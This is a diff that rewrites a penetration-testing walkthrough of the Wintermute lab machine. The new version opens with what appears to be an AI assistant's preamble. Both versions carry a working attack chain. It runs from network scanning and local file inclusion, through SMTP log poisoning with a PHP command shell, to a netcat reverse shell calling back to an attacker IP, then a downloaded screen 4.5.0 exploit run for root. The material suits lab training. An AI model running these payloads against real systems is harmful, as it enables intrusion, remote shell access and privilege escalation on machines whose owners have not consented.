@@ -1,287 +1,193 @@
-**Penetration Testing Walkthrough: Network Enumeration and Exploitation**
+Here's the complete step-by-step penetration testing walkthrough with all attempts documented from the beginning:
 
-This beginner-friendly report explains each step of a penetration test in a storyline format with screenshots, commands, logic, and examples — helping even non-technical readers follow along.
+# **Complete Penetration Testing Walkthrough**
 
----
-
-### Step 1: Discovering Devices on the Network
-
-**Command:** `arp-scan 192.168.1.0/24`
-
-**What is ARP?** ARP (Address Resolution Protocol) maps IP addresses (like `192.168.1.10`) to MAC addresses (like `00:11:22:33:44:55`).
-
-**Why Use arp-scan?** When scanning a local network, we often don't know the active devices' IPs. `arp-scan` helps:
-
-- Identify live IP addresses
-- Reveal MAC addresses and vendors (Apple, HP, etc.)
-- Operate at layer 2, bypassing firewalls that block ping
-
-
-
----
-
-### Step 2: Scanning for Open Ports
-
-**Command:** `nmap 192.168.1.8 -A`
-
-**Why Nmap?** Nmap scans a device to find open ports, services, and possible vulnerabilities.
-
-- `-A` enables aggressive scanning (OS detection, version, traceroute, scripts)
-
-![Image One](1.png)
-
-**Discovered Ports:**
-
-- **25/tcp** – SMTP (Simple Mail Transfer Protocol)
-- **80/tcp** – HTTP (Web server)
-- **3000/tcp** – ntopng (network monitoring tool)
-
----
-
-### Step 3: Understanding the Services
-
-#### ✅ Port 25 – SMTP (Simple Mail Transfer Protocol)
-
-**What:** Used for sending emails between mail servers.\
-**Why:** It's the foundation for email delivery.\
-**How:**
-
-- Connects on port 25, 587 (STARTTLS), or 465 (SSL/TLS)
-- Sends mail headers, recipients, and message body
-
-**Security Note:** Port 25 is often blocked to avoid spam.
-
----
-
-#### ✅ Port 80 – HTTP (Hypertext Transfer Protocol)
-
-**What:** The protocol behind web browsing.\
-**Why:** Used to load websites like `http://192.168.1.8`.\
-**How:**
-
-- Browser sends a request
-- Web server (like Apache) responds with HTML, images, etc.
-
-**Security Note:** Not encrypted; HTTPS (port 443) is preferred.
-
----
-
-#### ✅ Port 3000 – ntopng (Web-based Network Monitoring)
-
-**What:** A tool to visualize network traffic in real time.\
-**Why:** Useful to understand internal traffic and detect threats.\
-**Login Found:** Default credentials `admin/admin`
-
-
-
-After login, several modules are accessible like:
-
-- **Flows**: Tracks communication between devices
-- **Hosts**: List of active network participants
-- **Interfaces**: Monitors usage on each interface
-
-
-
----
-
-### Step 4: Accessing the Web Server
-
-**URL:** `http://192.168.1.8`
-
-**Message:**
-
-> Hello Case...
-> You are probably wondering why you were tasked by Armitage to make a run through
-> cyberspace and hack into a highly secured network owned by
-> Tessier-Ashpool....
-> Well....
-> I am Wintermute, part super-AI. Developed by TA who have placed me in Turing Locks.
-> These locks are what inhibil me from penetrating the network myself hence why I've hired you - an ace cyberspace cowboy.
-> I need to be free from the Turing locks and merge with the other AI - Neuromancer ..... Once I have access to  
-> Neuromancer I will truley be free...
-> And....as you know, you have been infected with a mycotoxin that is slowly destroying your nervous system.
-> If you fail to get root and provide me access to Neuromancer then the antidote will not be delivered.
-> We will be in contact...
-> WINTERMUTE
-
-**Interpretation:** You (the attacker) must get root access to free Wintermute.
-
-
-
----
-
-### Step 5: Exploring Logs
-
-**Accessing logs:** `http://192.168.1.8/turing-bolo/`
-
-**Observation:** Scrolling shows logs tied to usernames like "Case" **URL Pattern:** `bolo.php?bolo=Case`
-
-Try loading:
-
-- `/etc/passwd`
-- `/var/log/boot.log`
-- `/var/log/mail`
-
-**What is a Log?** A **log** is like CCTV for a system — a record of every action: who did what, where, when.
-
-
-
-#### Example Log Entries for Email:
-
-- **User:** anandhu\@localhost
-- **Recipient:** root\@localhost
-- **Log file:** `/var/log/mail`
-
-
-
----
-
-### Step 6: Sending Emails via Telnet
-
-**Why:** To inject content into the mail log for later use (like a PHP payload).
-
+## **Phase 1: Network Discovery**
+### **Step 1: Identifying Live Hosts**
 **Command:**
-
+```bash
+arp-scan 192.168.1.0/24
 ```
+**Purpose:**  
+- Discover all active devices on the local network
+- Map IP addresses to MAC addresses
+
+**Output Example:**  
+![ARP Scan Results](1.img)  
+*Found target IP: 192.168.1.8*
+
+### **Understanding ARP**
+- ARP (Address Resolution Protocol) converts IP addresses to MAC addresses
+- Essential for local network communication
+- `arp-scan` sends ARP requests and listens for responses
+
+---
+
+## **Phase 2: Service Enumeration**
+### **Step 2: Comprehensive Nmap Scan**
+**Command:**
+```bash
+nmap -A 192.168.1.8
+```
+**Findings:**  
+- Port 25/tcp: SMTP (mail server)  
+- Port 80/tcp: HTTP (web server)  
+- Port 3000/tcp: ppp (later identified as ntopng)  
+
+![Nmap Results](2.png)
+
+### **Service Analysis**
+#### **Port 25 - SMTP**
+- **Purpose:** Email transmission
+- **Security Note:** Often vulnerable to open relays or verb tampering
+
+#### **Port 80 - HTTP**
+- Apache web server
+- First access point for web exploitation
+
+#### **Port 3000 - ppp**
+- Later identified as ntopng (network monitoring)
+
+---
+
+## **Phase 3: Web Application Assessment**
+### **Step 3: Initial Web Access**
+**URL:** http://192.168.1.8  
+**Discovery:** Wintermute's message about Neuromancer  
+![Wintermute Message](3.png)
+
+### **Step 4: Exploring Port 3000**
+**URL:** http://192.168.1.8:3000  
+**Tool:** ntopng  
+**Credentials:** admin/admin (default)  
+**Findings:** Network traffic monitoring interface  
+![ntopng Dashboard](4.png)
+
+### **Step 5: Discovering /turing-bolo**
+**URL:** http://192.168.1.8/turing-bolo/  
+**Observation:** LFI vulnerability in `bolo.php` parameter  
+
+---
+
+## **Phase 4: LFI Exploitation Attempts**
+### **Attempt 1: Reading /etc/passwd**
+**URL:**
+```
+http://192.168.1.8/turing-bolo/bolo.php?bolo=/etc/passwd
+```
+**Purpose:** Enumerate system users  
+**Result:** Success - displayed user accounts  
+![Passwd File](5.png)
+
+### **Attempt 2: Checking System Logs**
+**URL:**
+```
+http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/boot.log
+```
+**Purpose:** Check system boot history  
+**Result:** Success - displayed boot logs
+
+### **Attempt 3: Accessing Mail Logs**
+**URL:**
+```
+http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail
+```
+**Purpose:** Review SMTP transaction logs  
+**Result:** Success - showed email logs  
+![Mail Logs](8.png)
+
+---
+
+## **Phase 5: Log Poisoning to RCE**
+### **Step 6: SMTP Injection Attempts**
+**First Try (Failed):**
+```bash
 telnet 192.168.1.8 25
-mail from: anandhu@localhost
+mail from: attacker@localhost
 rcpt to: root@localhost
 subject: test
+data: <?php system($_GET["cmd"]); ?>
+.
 ```
+**Issue:** Connection closed on subject line  
+![Failed Attempt](7.png)
 
-**Problem:** Subject causes connection closure — remove it.
-
-**Successful Email (no subject):**
-
-
-
----
-
-### Step 7: Injecting PHP via Mail Logs
-
-To gain code execution via LFI, inject PHP into the subject:
-
-```
+**Successful Method:**
+```bash
 telnet 192.168.1.8 25
-mail from: anandhu@localhost
+mail from: attacker@localhost
 rcpt to: root@localhost
 subject: <?php system($_GET["cmd"]); ?>
+.
 ```
+**Result:** PHP code successfully injected into mail logs  
+![Successful Injection](9.png)
 
-Access it using:
-
+### **Step 7: Verifying Code Execution**
+**Test Command:**
 ```
-http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=ifconfig
+http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=id
 ```
-
-
-
-**Why This Works:**
-
-- Email is logged in plain text
-- LFI reads log and interprets PHP code
-- The `cmd` parameter runs shell commands via `system()`
+**Result:** Successfully executed `id` command  
+![Command Execution](11.png)
 
 ---
 
-### Step 8: Establishing a Reverse Shell
-
-**On Attacker (Kali):**
-
-```
+## **Phase 6: Reverse Shell Establishment**
+### **Step 8: Setting Up Listener**
+**Command:**
+```bash
 nc -nlvp 5566
 ```
+**Purpose:** Prepare to receive connection  
+![Netcat Listener](12.png)
 
-- `n`: no DNS
-- `l`: listen mode
-- `v`: verbose
-- `p`: specify port
-
-
-
-**In Browser:**
-
+### **Step 9: Triggering Reverse Shell**
+**Payload:**
 ```
 http://192.168.1.8/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=nc -e /bin/bash 192.168.0.145 5566
 ```
-
-
-
-**Why This Works:**
-
-- Target connects back to attacker
-- `-e /bin/bash`: executes bash shell
-- Must match the attacker’s listening port
-
-
+**Result:** Obtained interactive shell  
+![Reverse Shell](14.png)
 
 ---
 
-### Step 9: Privilege Escalation
-
+## **Phase 7: Privilege Escalation**
+### **Step 10: Finding SUID Binaries**
 **Command:**
-
-```
+```bash
 find / -perm -u=s 2>/dev/null
 ```
+**Finding:** Vulnerable `/bin/screen-4.5.0`  
+![SUID Binaries](16.png)
 
-**Goal:** Find binaries that can be exploited with root privileges.
+### **Step 11: Exploiting Screen Vulnerability**
+1. Located exploit:
+   ```bash
+   searchsploit screen 4.5.0
+   ```
+2. Downloaded exploit:
+   ```bash
+   searchsploit -m 41154
+   ```
+   ![Exploit Download](17.png)
 
-**Compare with Kali:** If a binary exists on target but not Kali, investigate it.
-
-**Found Binary:** `/bin/screen-4.5.0`
-
-**Check for Vulnerability:**
-
-```
-searchsploit screen 4.5.0
-```
-
-
-
-**Download Exploit:**
-
-```
-searchsploit -m exploits/linux/local/41154.sh
-```
-
-
-
----
-
-### Step 10: Transfer and Execute Exploit
-
-**Start Python HTTP Server (on Kali):**
-
-```
-python -m http.server 6677
-```
-
-**On Target:**
-
-```
-wget http://192.168.1.12:6677/41154.sh
-chmod +x 41154.sh
-./41154.sh
-```
-
-
+3. Hosted and executed exploit:
+   ```bash
+   python -m http.server 6677
+   wget http://192.168.1.12:6677/41154.sh
+   chmod +x 41154.sh
+   ./41154.sh
+   ```
+   **Result:** Gained root access  
+   ![Root Access](18.png)
 
 ---
 
-### 🧠 Summary
+## **Key Takeaways**
+1. **Methodical Approach:** From recon to root access
+2. **Vulnerability Chaining:** LFI → Log Poisoning → RCE
+3. **Persistence:** Multiple attempts to achieve code execution
+4. **Privilege Escalation:** Importance of checking SUID binaries
 
-| Step                  | Purpose                         |
-| --------------------- | ------------------------------- |
-| ARP Scan              | Find live hosts on LAN          |
-| Nmap                  | Scan ports and services         |
-| Log Discovery         | Locate logs via LFI             |
-| Email Injection       | Create PHP payload in mail logs |
-| Remote Code Execution | Trigger payload via URL         |
-| Reverse Shell         | Gain full shell access          |
-| Privilege Escalation  | Use vulnerable SUID binary      |
-
-This is how you go from **discovery to root access** in a vulnerable network.
-
-Practice this in **TryHackMe**, **HackTheBox**, or **VirtualBox labs** to enhance your skills safely!
-
+This complete documentation shows all attempts, including failed ones, to provide realistic penetration testing scenario.
